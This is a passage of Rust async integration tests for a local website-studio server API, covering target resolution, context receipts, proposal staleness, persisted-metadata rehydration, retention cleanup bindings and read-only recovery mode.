            .await;
        assert_eq!(decision.status(), StatusCode::OK);
        assert_eq!(
            response_json(decision).await["project"]["revisionId"],
            revision_id,
            "non-adopt dispositions must not change Accepted"
        );
    }
}

#[tokio::test]
async fn target_v1_all_six_kinds_resolve_and_bind_context_receipts() {
    let harness = Harness::new().await;
    let created = response_json(
        harness
            .post(
                "/api/v1/projects",
                json!({"schemaVersion":"1","template":"blank"}),
            )
            .await,
    )
    .await;
    let project_id = string_at(&created, "/project/id");
    let revision_id = string_at(&created, "/project/revisionId");
    let cases = [
        ("page", ""),
        ("block", "hero"),
        ("element", "hero-heading"),
        ("text", "hero-heading"),
        ("point", "hero"),
        ("region", "hero"),
    ];

    for (index, (kind, element_id)) in cases.into_iter().enumerate() {
        let response = harness
            .post(
                &format!("/api/v1/projects/{project_id}/targets"),
                target_request(&revision_id, index as u128 + 1, kind, element_id),
            )
            .await;
        let status = response.status();
        let target = response_json(response).await;
        assert_eq!(status, StatusCode::CREATED, "{kind} target: {target}");
        assert_eq!(target["target"]["kind"], kind);
        assert_eq!(target["target"]["schemaVersion"], 1);
        assert_eq!(target["resolution"]["schemaVersion"], 1);
        assert_eq!(target["resolution"]["resolverVersion"], 1);
        assert_eq!(target["resolution"]["status"], "resolved");
        assert_eq!(target["resolution"]["selectedCandidateId"], "candidate-1");
        assert_eq!(
            target["resolution"]["targetId"],
            target["target"]["targetId"]
        );
        assert_eq!(target["resolution"]["captureRevisionId"], revision_id);
        assert_eq!(target["resolution"]["resolvedRevisionId"], revision_id);
        let resolution_id = string_at(&target, "/resolutionId");
        assert!(resolution_id.starts_with("res_"));
        assert_eq!(resolution_id.len(), 36);

        let context = harness
            .post(
                &format!("/api/v1/projects/{project_id}/contexts"),
                context_request(&revision_id, &target, &format!("{kind} target only")),
            )
            .await;
        let context_status = context.status();
        let context = response_json(context).await;
        assert_eq!(
            context_status,
            StatusCode::CREATED,
            "{kind} context: {context}"
        );
        assert_eq!(context["context"]["targetResolutionId"], resolution_id);
        let canonical: Value =
            serde_json::from_str(context["context"]["canonicalJson"].as_str().unwrap()).unwrap();
        assert_eq!(
            canonical["numericEncoding"],
            "serde-json-shortest-decimal-string-v1"
        );
        assert_eq!(canonical["target"]["kind"], kind);
        assert_eq!(canonical["targetResolution"]["status"], "resolved");
        assert!(canonical["target"]["viewport"]["cssWidth"].is_string());
        assert!(canonical["targetResolution"]["candidates"][0]["score"].is_string());
    }

    let page_target = response_json(
        harness
            .post(
                &format!("/api/v1/projects/{project_id}/targets"),
                target_request(&revision_id, 99, "page", ""),
            )
            .await,
    )
    .await;
    let mut mismatched = context_request(&revision_id, &page_target, "wrong receipt");
    mismatched["resolutionId"] = json!("res_00000000000000000000000000000000");
    let response = harness
        .post(
            &format!("/api/v1/projects/{project_id}/contexts"),
            mismatched,
        )
        .await;
    assert_eq!(response.status(), StatusCode::CONFLICT);
    assert_eq!(
        response_json(response).await["error"]["code"],
        "target_resolution_mismatch"
    );
}

#[tokio::test]
async fn ambiguous_and_detached_targets_are_preserved_but_cannot_create_contexts() {
    let harness = Harness::new().await;
    let created = response_json(
        harness
            .post(
                "/api/v1/projects",
                json!({"schemaVersion":"1","template":"blank"}),
            )
            .await,
    )
    .await;
    let project_id = string_at(&created, "/project/id");
    let revision_id = string_at(&created, "/project/revisionId");

    let mut ambiguous_request = element_target_request(&revision_id, 1, "hero-heading");
    ambiguous_request["target"]["elementAnchor"]["uniqueElementId"] =
        json!("missing-but-text-matches");
    let ambiguous = response_json(
        harness
            .post(
                &format!("/api/v1/projects/{project_id}/targets"),
                ambiguous_request,
            )
            .await,
    )
    .await;
    assert_eq!(ambiguous["resolution"]["status"], "ambiguous");
    assert!(
        ambiguous["resolution"]["selectedCandidateId"].is_null(),
        "an ambiguous result must never select a candidate"
    );
    assert_eq!(
        ambiguous["resolution"]["candidates"][0]["reasons"][0],
        "text_quote"
    );
    let ambiguous_context = harness
        .post(
            &format!("/api/v1/projects/{project_id}/contexts"),
            context_request(&revision_id, &ambiguous, "must not guess"),
        )
        .await;
    assert_eq!(ambiguous_context.status(), StatusCode::CONFLICT);
    assert_eq!(
        response_json(ambiguous_context).await["error"]["code"],
        "target_ambiguous"
    );

    let mut detached_request = element_target_request(&revision_id, 2, "hero-heading");
    detached_request["target"]["elementAnchor"]["uniqueElementId"] = json!("missing-detached");
    detached_request["target"]["elementAnchor"]["accessibleName"] =
        json!("content that is not in the document");
    let detached = response_json(
        harness
            .post(
                &format!("/api/v1/projects/{project_id}/targets"),
                detached_request,
            )
            .await,
    )
    .await;
    assert_eq!(detached["resolution"]["status"], "detached");
    assert!(
        detached["resolution"]["candidates"]
            .as_array()
            .unwrap()
            .is_empty()
    );
    let detached_context = harness
        .post(
            &format!("/api/v1/projects/{project_id}/contexts"),
            context_request(&revision_id, &detached, "must fail closed"),
        )
        .await;
    assert_eq!(detached_context.status(), StatusCode::CONFLICT);
    assert_eq!(
        response_json(detached_context).await["error"]["code"],
        "target_detached"
    );
}

#[tokio::test]
async fn proposal_captured_target_becomes_stale_after_the_proposal_is_closed() {
    let _workflow_guard = SYNAPSEGIT_WORKFLOW_TEST_LOCK.lock().await;
    let harness = Harness::new().await;
    let created = response_json(
        harness
            .post(
                "/api/v1/projects",
                json!({"schemaVersion":"1","template":"blank"}),
            )
            .await,
    )
    .await;
    let project_id = string_at(&created, "/project/id");
    let revision_id = string_at(&created, "/project/revisionId");
    let accepted_target = response_json(
        harness
            .post(
                &format!("/api/v1/projects/{project_id}/targets"),
                element_target_request(&revision_id, 1, "hero-heading"),
            )
            .await,
    )
    .await;
    let context = response_json(
        harness
            .post(
                &format!("/api/v1/projects/{project_id}/contexts"),
                context_request(&revision_id, &accepted_target, "make a proposal"),
            )
            .await,
    )
    .await;
    let proposal = response_json(
        harness
            .post(
                &format!("/api/v1/projects/{project_id}/proposals"),
                json!({
                    "schemaVersion":"1",
                    "contextId":string_at(&context, "/context/id"),
                    "contextSha256":string_at(&context, "/context/sha256")
                }),
            )
            .await,
    )
    .await;
    let proposal_id = string_at(&proposal, "/proposal/id");
    let review_id = string_at(&proposal, "/proposal/reviewId");
    let proposed_target_request = target_request_for_source(
        &revision_id,
        2,
        "element",
        "hero-heading",
        "proposal",
        Some(&proposal_id),
    );
    let proposed_target_response = harness
        .post(
            &format!("/api/v1/projects/{project_id}/targets"),
            proposed_target_request,
        )
        .await;
    let proposed_target_status = proposed_target_response.status();
    let proposed_target = response_json(proposed_target_response).await;
    assert_eq!(
        proposed_target_status,
        StatusCode::CREATED,
        "proposal target: {proposed_target}"
    );
    assert_eq!(proposed_target["resolution"]["status"], "resolved");
    assert_eq!(proposed_target["target"]["captureProposalId"], proposal_id);

    let intent = "close-proposal-target-test";
    let approval = response_json(
        harness
            .post(
                &format!("/api/v1/reviews/{review_id}/approvals"),
                json!({
                    "schemaVersion":"1",
                    "proposalId":proposal_id,
                    "expectedRevisionId":revision_id,
                    "disposition":"rejected",
                    "intentId":intent
                }),
            )
            .await,
    )
    .await;
    let decision = harness
        .post(
            &format!("/api/v1/reviews/{review_id}/decisions"),
            json!({
                "schemaVersion":"1",
                "approvalToken":string_at(&approval, "/approval/token"),
                "proposalId":proposal_id,
                "expectedRevisionId":revision_id,
                "disposition":"rejected",
                "intentId":intent,
                "rationale":"close the proposal fixture"
            }),
        )
        .await;
    assert_eq!(decision.status(), StatusCode::OK);

    let stale_context = harness
        .post(
            &format!("/api/v1/projects/{project_id}/contexts"),
            context_request(
                &revision_id,
                &proposed_target,
                "this proposal target is no longer authoritative",
            ),
        )
        .await;
    assert_eq!(stale_context.status(), StatusCode::CONFLICT);
    assert_eq!(
        response_json(stale_context).await["error"]["code"],
        "target_source_proposal_stale"
    );
}

#[tokio::test]
async fn target_is_immutable_private_metadata_and_rehydrates_across_restart() {
    let root = tempfile::tempdir().unwrap();
    let config = || {
        ServerConfig::new(
            EDITOR_ORIGIN,
            EDITOR_HOST,
            PREVIEW_ORIGIN,
            root.path(),
            root.path().join("missing-web-dist"),
        )
    };
    let first_state = StudioState::new(config()).unwrap();
    let first_token = bootstrap_token(&first_state).await;
    let created = response_json(
        post_for(
            &first_state,
            &first_token,
            "/api/v1/projects",
            json!({"schemaVersion":"1","template":"blank"}),
        )
        .await,
    )
    .await;
    let project_id = string_at(&created, "/project/id");
    let revision_id = string_at(&created, "/project/revisionId");
    let request = element_target_request(&revision_id, 1, "hero-heading");
    let expected_target = request["target"].clone();
    let response = post_for(
        &first_state,
        &first_token,
        &format!("/api/v1/projects/{project_id}/targets"),
        request.clone(),
    )
    .await;
    assert_eq!(response.status(), StatusCode::CREATED);
    let target = response_json(response).await;
    let target_id = string_at(&target, "/target/targetId");
    let target_path = root
        .path()
        .join("managed-v1/projects")
        .join(&project_id)
        .join("targets")
        .join(format!("{target_id}.json"));
    let persisted_before = std::fs::read(&target_path).unwrap();
    assert_eq!(
        serde_json::from_slice::<Value>(&persisted_before).unwrap(),
        expected_target
    );
    assert!(!String::from_utf8_lossy(&persisted_before).contains("runtimeHandle"));

    let duplicate = post_for(
        &first_state,
        &first_token,
        &format!("/api/v1/projects/{project_id}/targets"),
        request,
    )
    .await;
    assert_eq!(duplicate.status(), StatusCode::CONFLICT);
    assert_eq!(
        response_json(duplicate).await["error"]["code"],
        "target_id_exists"
    );
    assert_eq!(std::fs::read(&target_path).unwrap(), persisted_before);

    let mut runtime_handle = element_target_request(&revision_id, 2, "hero-heading");
    runtime_handle["target"]["runtimeHandle"] = json!("node-123");
    let rejected = post_for(
        &first_state,
        &first_token,
        &format!("/api/v1/projects/{project_id}/targets"),
        runtime_handle,
    )
    .await;
    assert_eq!(rejected.status(), StatusCode::BAD_REQUEST);
    assert!(
        !target_path
            .with_file_name(format!("{}.json", test_target_id(2)))
            .exists()
    );

    drop(first_state);
    let second_state = StudioState::new(config()).unwrap();
    let second_token = bootstrap_token(&second_state).await;
    let context = post_for(
        &second_state,
        &second_token,
        &format!("/api/v1/projects/{project_id}/contexts"),
        context_request(&revision_id, &target, "restored target"),
    )
    .await;
    let context_status = context.status();
    let context = response_json(context).await;
    assert_eq!(
        context_status,
        StatusCode::CREATED,
        "restored target context: {context}"
    );
    assert_eq!(
        context["context"]["targetResolutionId"],
        target["resolutionId"]
    );
    assert_eq!(std::fs::read(&target_path).unwrap(), persisted_before);
}

#[tokio::test]
async fn target_capacity_reuses_only_unreferenced_persisted_metadata() {
    let root = tempfile::tempdir().unwrap();
    let config = || {
        ServerConfig::new(
            EDITOR_ORIGIN,
            EDITOR_HOST,
            PREVIEW_ORIGIN,
            root.path(),
            root.path().join("missing-web-dist"),
        )
    };
    let first_state = StudioState::new(config()).unwrap();
    let first_token = bootstrap_token(&first_state).await;
    let created = response_json(
        post_for(
            &first_state,
            &first_token,
            "/api/v1/projects",
            json!({"schemaVersion":"1","template":"blank"}),
        )
        .await,
    )
    .await;
    let project_id = string_at(&created, "/project/id");
    let revision_id = string_at(&created, "/project/revisionId");
    let targets_uri = format!("/api/v1/projects/{project_id}/targets");
    let contexts_uri = format!("/api/v1/projects/{project_id}/contexts");

    let protected = response_json(
        post_for(
            &first_state,
            &first_token,
            &targets_uri,
            element_target_request(&revision_id, 1, "hero-heading"),
        )
        .await,
    )
    .await;
    let protected_context = post_for(
        &first_state,
        &first_token,
        &contexts_uri,
        context_request(&revision_id, &protected, "retain referenced target"),
    )
    .await;
    assert_eq!(protected_context.status(), StatusCode::CREATED);

    let mut recyclable = Value::Null;
    let mut retained_unreferenced = Vec::new();
    for seed in 2..=MAX_TARGETS_PER_PROJECT as u128 {
        let response = post_for(
            &first_state,
            &first_token,
            &targets_uri,
            element_target_request(&revision_id, seed, "hero-heading"),
        )
        .await;
        assert_eq!(response.status(), StatusCode::CREATED, "seed {seed}");
        let response = response_json(response).await;
        if seed == 2 {
            recyclable = response;
        } else {
            retained_unreferenced.push(response);
        }
    }
    assert_ne!(recyclable, Value::Null);

    let targets_root = root
        .path()
        .join("managed-v1/projects")
        .join(&project_id)
        .join("targets");
    let recyclable_path = targets_root.join(format!("{}.json", test_target_id(2)));
    let recyclable_bytes = std::fs::read(&recyclable_path).unwrap();
    let oversized_response = post_for(
        &first_state,
        &first_token,
        &targets_uri,
        oversized_canonical_target_request(&revision_id, 99),
    )
    .await;
    assert_eq!(oversized_response.status(), StatusCode::BAD_REQUEST);
    assert_eq!(std::fs::read(&recyclable_path).unwrap(), recyclable_bytes);
    {
        let store = first_state.store().unwrap();
        let project = store.projects.get(&project_id).unwrap();
        assert!(project.targets.contains_key(&test_target_id(2)));
        assert!(!project.targets.contains_key(&test_target_id(99)));
    }

    let replacement_response = post_for(
        &first_state,
        &first_token,
        &targets_uri,
        element_target_request(&revision_id, 33, "hero-heading"),
    )
    .await;
    assert_eq!(replacement_response.status(), StatusCode::CREATED);
    let replacement = response_json(replacement_response).await;
    retained_unreferenced.push(replacement.clone());

    {
        let store = first_state.store().unwrap();
        let project = store.projects.get(&project_id).unwrap();
        assert_eq!(project.targets.len(), MAX_TARGETS_PER_PROJECT);
        assert!(project.targets.contains_key(&test_target_id(1)));
        assert!(!project.targets.contains_key(&test_target_id(2)));
        assert!(project.targets.contains_key(&test_target_id(33)));
        assert!(
            project
                .contexts
                .values()
                .any(|context| context.target_id == test_target_id(1))
        );
    }
    assert!(
        targets_root
            .join(format!("{}.json", test_target_id(1)))
            .is_file()
    );
    assert!(
        !targets_root
            .join(format!("{}.json", test_target_id(2)))
            .exists()
    );
    assert!(
        targets_root
            .join(format!("{}.json", test_target_id(33)))
            .is_file()
    );

    let evicted_context = post_for(
        &first_state,
        &first_token,
        &contexts_uri,
        context_request(&revision_id, &recyclable, "evicted target must be detached"),
    )
    .await;
    assert_eq!(evicted_context.status(), StatusCode::NOT_FOUND);

    for target in &retained_unreferenced {
        let context = post_for(
            &first_state,
            &first_token,
            &contexts_uri,
            context_request(&revision_id, target, "protect retained target"),
        )
        .await;
        assert_eq!(context.status(), StatusCode::CREATED);
    }
    let fully_referenced_overflow = post_for(
        &first_state,
        &first_token,
        &targets_uri,
        element_target_request(&revision_id, 34, "hero-heading"),
    )
    .await;
    assert_eq!(
        fully_referenced_overflow.status(),
        StatusCode::TOO_MANY_REQUESTS
    );
    assert_eq!(
        response_json(fully_referenced_overflow).await["error"]["code"],
        "local_capacity_reached"
    );
    assert!(
        !targets_root
            .join(format!("{}.json", test_target_id(34)))
            .exists()
    );

    drop(first_state);
    let restarted = StudioState::new(config()).unwrap();
    let restarted_token = bootstrap_token(&restarted).await;
    let restored_protected = post_for(
        &restarted,
        &restarted_token,
        &contexts_uri,
        context_request(
            &revision_id,
            &protected,
            "protected target survives restart",
        ),
    )
    .await;
    assert_eq!(restored_protected.status(), StatusCode::CREATED);
    let restored_replacement = post_for(
        &restarted,
        &restarted_token,
        &contexts_uri,
        context_request(&revision_id, &replacement, "replacement survives restart"),
    )
    .await;
    assert_eq!(restored_replacement.status(), StatusCode::CREATED);
}

#[tokio::test]
async fn restart_rejects_a_target_whose_filename_and_canonical_id_disagree() {
    let root = tempfile::tempdir().unwrap();
    let config = || {
        ServerConfig::new(
            EDITOR_ORIGIN,
            EDITOR_HOST,
            PREVIEW_ORIGIN,
            root.path(),
            root.path().join("missing-web-dist"),
        )
    };
    let state = StudioState::new(config()).unwrap();
    let token = bootstrap_token(&state).await;
    let created = response_json(
        post_for(
            &state,
            &token,
            "/api/v1/projects",
            json!({"schemaVersion":"1","template":"blank"}),
        )
        .await,
    )
    .await;
    let project_id = string_at(&created, "/project/id");
    let revision_id = string_at(&created, "/project/revisionId");
    let target = response_json(
        post_for(
            &state,
            &token,
            &format!("/api/v1/projects/{project_id}/targets"),
            element_target_request(&revision_id, 1, "hero-heading"),
        )
        .await,
    )
    .await;
    let target_id = string_at(&target, "/target/targetId");
    let target_path = root
        .path()
        .join("managed-v1/projects")
        .join(project_id)
        .join("targets")
        .join(format!("{target_id}.json"));
    drop(state);

    let mut mismatched = target["target"].clone();
    mismatched["targetId"] = json!(test_target_id(2));
    std::fs::write(target_path, serde_json::to_vec(&mismatched).unwrap()).unwrap();

    let error = StudioState::new(config()).unwrap_err();
    assert_eq!(error.kind(), std::io::ErrorKind::InvalidData);
}

#[tokio::test]
async fn retained_state_rehydrates_blank_project_and_immutable_revision() {
    let root = tempfile::tempdir().unwrap();
    let config = || {
        ServerConfig::new(
            EDITOR_ORIGIN,
            EDITOR_HOST,
            PREVIEW_ORIGIN,
            root.path(),
            root.path().join("missing-web-dist"),
        )
    };
    let first_state = StudioState::new(config()).unwrap();
    let first_token = bootstrap_token(&first_state).await;
    let created = post_for(
        &first_state,
        &first_token,
        "/api/v1/projects",
        json!({"schemaVersion":"1","template":"blank"}),
    )
    .await;
    let created = response_json(created).await;
    let project_id = string_at(&created, "/project/id");
    let revision_id = string_at(&created, "/project/revisionId");
    let manifest_sha = string_at(&created, "/project/acceptedManifestSha256");
    let first_preview_url = string_at(&created, "/project/previewUrl");
    let first_secret_bound_url =
        scoped_preview_url(&first_state, "ses_fixed", &project_id, &revision_id);
    drop(first_state);

    let second_state = StudioState::new(config()).unwrap();
    let second_token = bootstrap_token(&second_state).await;
    let listed =
        response_json(get_for(&second_state, &second_token, "/api/v1/projects").await).await;
    assert_eq!(listed["projects"].as_array().unwrap().len(), 1);
    assert_eq!(listed["projects"][0]["id"], project_id);
    assert_eq!(listed["projects"][0]["revisionId"], revision_id);
    assert_eq!(
        listed["projects"][0]["acceptedManifestSha256"],
        manifest_sha
    );
    assert_eq!(listed["projects"][0]["status"], "ready");
    assert_ne!(
        listed["projects"][0]["previewUrl"], first_preview_url,
        "a restarted server must not reproduce a prior session origin"
    );
    assert_ne!(
        scoped_preview_url(&second_state, "ses_fixed", &project_id, &revision_id),
        first_secret_bound_url,
        "the process preview secret must rotate across state reconstruction"
    );

    let project_root = root.path().join("managed-v1/projects").join(&project_id);
    assert!(
        project_root
            .join("revisions")
            .join(format!("{revision_id}.json"))
            .is_file()
    );
    let site = storage::materialized_site_path(root.path(), &project_id);
    assert!(site.join("index.html").is_file());
    assert!(site.join("styles.css").is_file());
    assert!(!site.join(".studio").exists());
    assert!(root.path().join("managed-v1/objects").is_dir());
}

#[tokio::test]
async fn retention_artifact_cleanup_is_exact_non_destructive_and_durable() {
    let mut harness = Harness::new().await;
    let created = response_json(
        harness
            .post(
                "/api/v1/projects",
                json!({"schemaVersion":"1","template":"blank"}),
            )
            .await,
    )
    .await;
    let project_id = string_at(&created, "/project/id");
    let revision_id = string_at(&created, "/project/revisionId");
    let accepted_manifest_sha256 = string_at(&created, "/project/acceptedManifestSha256");

    let export = harness
        .post(
            &format!("/api/v1/projects/{project_id}/exports"),
            json!({"schemaVersion":"1","revisionId":revision_id}),
        )
        .await;
    assert_eq!(export.status(), StatusCode::CREATED);
    let export = response_json(export).await;
    let export_id = string_at(&export, "/export/id");
    let export_sha256 = string_at(&export, "/export/sha256");
    let export_url = string_at(&export, "/export/downloadUrl");
    let export_bytes = response_bytes(harness.get(&export_url).await).await;

    let inventory = response_json(harness.get("/api/v1/retention").await).await;
    assert_eq!(inventory["retention"]["automaticGc"], false);
    assert_eq!(inventory["retention"]["telemetry"], "absent");
    assert_eq!(
        inventory["retention"]["cleanupRequiresExplicitConfirmation"],
        true
    );
    let project = inventory["retention"]["projects"]
        .as_array()
        .unwrap()
        .iter()
        .find(|project| project["projectId"] == project_id)
        .unwrap();
    assert_eq!(project["revisionId"], revision_id);
    assert_eq!(project["acceptedManifestSha256"], accepted_manifest_sha256);
    let artifact = project["artifacts"]
        .as_array()
        .unwrap()
        .iter()
        .find(|artifact| artifact["id"] == export_id)
        .unwrap();
    assert_eq!(artifact["kind"], "static_export");
    assert_eq!(artifact["sha256"], export_sha256);
    assert_eq!(
        artifact["payloadByteLength"].as_u64().unwrap(),
        export_bytes.len() as u64
    );

    let mismatched_hash = harness
        .post(
            "/api/v1/retention/cleanup",
            json!({
                "schemaVersion":"1",
                "scope":"static_export",
                "projectId":project_id,
                "artifactId":export_id,
                "expectedSha256":"00".repeat(32),
                "confirmation":export_id
            }),
        )
        .await;
    assert_eq!(mismatched_hash.status(), StatusCode::CONFLICT);
    assert_eq!(
        response_json(mismatched_hash).await["error"]["code"],
        "cleanup_binding_mismatch"
    );

    // Payload length is inventory evidence, not caller-controlled deletion input.
    // An attempted mismatched override is rejected by the strict request shape.
    let mismatched_length_override = harness
        .post(
            "/api/v1/retention/cleanup",
            json!({
                "schemaVersion":"1",
                "scope":"static_export",
                "projectId":project_id,
                "artifactId":export_id,
                "expectedSha256":export_sha256,
                "expectedPayloadByteLength":export_bytes.len() + 1,
                "confirmation":export_id
            }),
        )
        .await;
    assert_eq!(mismatched_length_override.status(), StatusCode::BAD_REQUEST);
    assert_eq!(
        response_bytes(harness.get(&export_url).await).await,
        export_bytes
    );
    let accepted_after_rejections =
        response_json(harness.get(&format!("/api/v1/projects/{project_id}")).await).await;
    assert_eq!(
        accepted_after_rejections["project"]["revisionId"],
        revision_id
    );
    assert_eq!(
        accepted_after_rejections["project"]["acceptedManifestSha256"],
        accepted_manifest_sha256
    );

    let cleanup = harness
        .post(
            "/api/v1/retention/cleanup",
            json!({
                "schemaVersion":"1",
                "scope":"static_export",
                "projectId":project_id,
                "artifactId":export_id,
                "expectedSha256":export_sha256,
                "confirmation":export_id
            }),
        )
        .await;
    assert_eq!(cleanup.status(), StatusCode::OK);
    let cleanup = response_json(cleanup).await;
    assert_eq!(cleanup["removed"]["scope"], "static_export");
    assert_eq!(cleanup["removed"]["id"], export_id);
    assert_eq!(
        cleanup["removed"]["payloadByteLength"].as_u64().unwrap(),
        export_bytes.len() as u64
    );
    assert_eq!(
        harness.get(&export_url).await.status(),
        StatusCode::NOT_FOUND
    );

    harness = harness.restart().await;
    let accepted_after_restart =
        response_json(harness.get(&format!("/api/v1/projects/{project_id}")).await).await;
    assert_eq!(accepted_after_restart["project"]["revisionId"], revision_id);
    assert_eq!(
        accepted_after_restart["project"]["acceptedManifestSha256"],
        accepted_manifest_sha256
    );
    let inventory_after_restart = response_json(harness.get("/api/v1/retention").await).await;
    assert!(
        inventory_after_restart["retention"]["projects"][0]["artifacts"]
            .as_array()
            .unwrap()
            .is_empty()
    );
    assert_eq!(
        harness.get(&export_url).await.status(),
        StatusCode::NOT_FOUND
    );
}

#[tokio::test]
async fn failed_proposal_cleanup_allows_next_proposal_before_and_after_restart() {
    let _workflow_guard = SYNAPSEGIT_WORKFLOW_TEST_LOCK.lock().await;
    let mut harness = Harness::new().await;
    let (project_id, revision_id, first_proposal_id, first_review_id) =
        create_blank_fake_proposal(&harness, 7_100).await;
    let first_evidence =
        transition_review_to_terminal_denial(&harness, &project_id, &first_review_id);
    reconcile_and_cleanup_failed_proposal(
        &harness,
        &project_id,
        &first_proposal_id,
        &first_review_id,
    )
    .await;

    let second = create_fake_proposal_for_project(&harness, &project_id, &revision_id, 7_101).await;
    let second_proposal_id = string_at(&second, "/proposal/id");
    let second_review_id = string_at(&second, "/proposal/reviewId");
    let second_evidence =
        transition_review_to_terminal_denial(&harness, &project_id, &second_review_id);
    reconcile_and_cleanup_failed_proposal(
        &harness,
        &project_id,
        &second_proposal_id,
        &second_review_id,
    )
    .await;

    let (repository_path, journal_path) = harness
        .state
        .storage()
        .unwrap()
        .synapse_paths(&project_id)
        .unwrap();
    let repository = SynapseRepository::open(repository_path).unwrap();
    for (proposal_ref, proposal_head) in [&first_evidence, &second_evidence] {
        assert_eq!(
            repository.refs().get(proposal_ref).unwrap().unwrap().head,
            proposal_head.as_str(),
            "failed Proposal cleanup must retain the authoritative Ref"
        );
    }
    let journal = SqliteReviewJournal::open(journal_path).unwrap();
    for review_id in [&first_review_id, &second_review_id] {
        assert_eq!(
            journal
                .get_review(&JournalReviewId::parse(review_id.to_owned()).unwrap())
                .unwrap()
                .state(),
            JournalReviewState::TerminalDenial,
            "failed Proposal cleanup must retain the terminal journal row"
        );
    }
    drop(journal);
    drop(repository);

    harness = harness.restart().await;
    let third = create_fake_proposal_for_project(&harness, &project_id, &revision_id, 7_102).await;
    assert_ne!(string_at(&third, "/proposal/reviewId"), first_review_id);
    assert_ne!(string_at(&third, "/proposal/reviewId"), second_review_id);
}

#[tokio::test]
async fn retention_project_cleanup_requires_exact_accepted_binding_and_is_durable() {
    let mut harness = Harness::new().await;
    let created = response_json(
        harness
            .post(
                "/api/v1/projects",
                json!({"schemaVersion":"1","template":"blank"}),
            )
            .await,
    )
    .await;
    let project_id = string_at(&created, "/project/id");
    let revision_id = string_at(&created, "/project/revisionId");
    let accepted_manifest_sha256 = string_at(&created, "/project/acceptedManifestSha256");

    for request in [
        json!({
            "schemaVersion":"1",
            "scope":"project",
            "projectId":project_id,
            "expectedRevisionId":format!("rev_{}", "0".repeat(32)),
            "expectedManifestSha256":accepted_manifest_sha256,
            "confirmation":project_id
        }),
        json!({
            "schemaVersion":"1",
            "scope":"project",
            "projectId":project_id,
            "expectedRevisionId":revision_id,
            "expectedManifestSha256":"00".repeat(32),
            "confirmation":project_id
        }),
        json!({
            "schemaVersion":"1",
            "scope":"project",
            "projectId":project_id,
            "expectedRevisionId":revision_id,
            "expectedManifestSha256":accepted_manifest_sha256,
            "confirmation":"prj_wrong"
        }),
    ] {
        let rejected = harness.post("/api/v1/retention/cleanup", request).await;
        assert_eq!(rejected.status(), StatusCode::CONFLICT);
        assert_eq!(
            harness
                .get(&format!("/api/v1/projects/{project_id}"))
                .await
                .status(),
            StatusCode::OK
        );
    }

    let cleanup = harness
        .post(
            "/api/v1/retention/cleanup",
            json!({
                "schemaVersion":"1",
                "scope":"project",
                "projectId":project_id,
                "expectedRevisionId":revision_id,
                "expectedManifestSha256":accepted_manifest_sha256,
                "confirmation":project_id
            }),
        )
        .await;
    assert_eq!(cleanup.status(), StatusCode::OK);
    let cleanup = response_json(cleanup).await;
    assert_eq!(cleanup["removed"]["scope"], "project");
    assert_eq!(cleanup["removed"]["id"], project_id);
    assert!(
        cleanup["retention"]["projects"]
            .as_array()
            .unwrap()
            .is_empty()
    );
    assert_eq!(
        harness
            .get(&format!("/api/v1/projects/{project_id}"))
            .await
            .status(),
        StatusCode::NOT_FOUND
    );

    harness = harness.restart().await;
    assert!(
        response_json(harness.get("/api/v1/projects").await).await["projects"]
            .as_array()
            .unwrap()
            .is_empty()
    );
    assert!(
        response_json(harness.get("/api/v1/retention").await).await["retention"]["projects"]
            .as_array()
            .unwrap()
            .is_empty()
    );
}

#[tokio::test]
async fn fail_closed_storage_starts_capability_limited_read_only_recovery() {
    let root = tempfile::tempdir().unwrap();
    let config = || {
        ServerConfig::new(
            EDITOR_ORIGIN,
            EDITOR_HOST,
            PREVIEW_ORIGIN,
            root.path(),
            root.path().join("missing-web-dist"),
        )
    };
    let normal = StudioState::new(config()).unwrap();
    let normal_token = bootstrap_token(&normal).await;
    let created = response_json(
        post_for(
            &normal,
            &normal_token,
            "/api/v1/projects",
            json!({"schemaVersion":"1","template":"blank"}),
        )
        .await,
    )
    .await;
    let project_id = string_at(&created, "/project/id");
    let revision_id = string_at(&created, "/project/revisionId");
    let accepted_manifest_sha256 = string_at(&created, "/project/acceptedManifestSha256");
    drop(normal);

    let layout = root
        .path()
        .join("managed-v1/projects")
        .join(&project_id)
        .join("layout.json");
    std::fs::write(&layout, br#"{"schemaVersion":"1","layoutVersion":"999"}"#).unwrap();
    let normal_error = StudioState::new(config()).unwrap_err();
    assert_eq!(normal_error.kind(), std::io::ErrorKind::InvalidData);

    let disk_before_recovery = source_fingerprint(root.path());
    let recovery = StudioState::new_recovery(config()).unwrap();
    let bootstrap = editor_router(recovery.clone())
        .oneshot(
            Request::builder()
                .uri("/api/v1/bootstrap")
                .header(HOST, EDITOR_HOST)
                .header("sec-fetch-site", "same-origin")
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(bootstrap.status(), StatusCode::OK);
    let bootstrap = response_json(bootstrap).await;
    assert_eq!(
        bootstrap["capabilities"]["operatingMode"],
        "read_only_recovery"
    );
    assert_eq!(bootstrap["capabilities"]["importAvailable"], false);
    assert!(
        bootstrap["capabilities"]["recoveryPointCount"]
            .as_u64()
            .is_some_and(|count| count >= 1)
    );
    let recovery_token = string_at(&bootstrap, "/session/token");

    let points = response_json(get_for(&recovery, &recovery_token, "/api/v1/recovery").await).await;
    let points = points["recoveryPoints"].as_array().unwrap();
    assert_eq!(
        bootstrap["capabilities"]["recoveryPointCount"].as_u64(),
        Some(points.len() as u64)
    );
    let accepted = points
        .iter()
        .find(|point| {
            point["kind"] == "last_accepted"
                && point["projectId"] == project_id
                && point["diagnostic"]["verified"] == true
        })
        .unwrap();
    assert_eq!(accepted["revisionId"], revision_id);
    assert_eq!(accepted["artifactManifestSha256"], accepted_manifest_sha256);
    let export_url = string_at(accepted, "/exportUrl");
    let export = get_for(&recovery, &recovery_token, &export_url).await;
    assert_eq!(export.status(), StatusCode::OK);
    assert_eq!(
        export.headers().get(CONTENT_TYPE).unwrap(),
        "application/zip"
    );
    assert_eq!(
        export
            .headers()
            .get("x-content-sha256")
            .unwrap()
            .to_str()
            .unwrap()
            .len(),
        64
    );
    assert_eq!(
        export
            .headers()
            .get("x-recovery-point-binding")
            .unwrap()
            .to_str()
            .unwrap()
            .len(),
        64
    );
    let mut archive = zip::ZipArchive::new(Cursor::new(response_bytes(export).await)).unwrap();
    assert!(archive.by_name("index.html").is_ok());
    assert!(archive.by_name("styles.css").is_ok());

    let mutation = post_for(
        &recovery,
        &recovery_token,
        "/api/v1/projects",
        json!({"schemaVersion":"1","template":"blank"}),
    )
    .await;
    assert_eq!(mutation.status(), StatusCode::LOCKED);
    assert_eq!(
        response_json(mutation).await["error"]["code"],
        "read_only_recovery"
    );
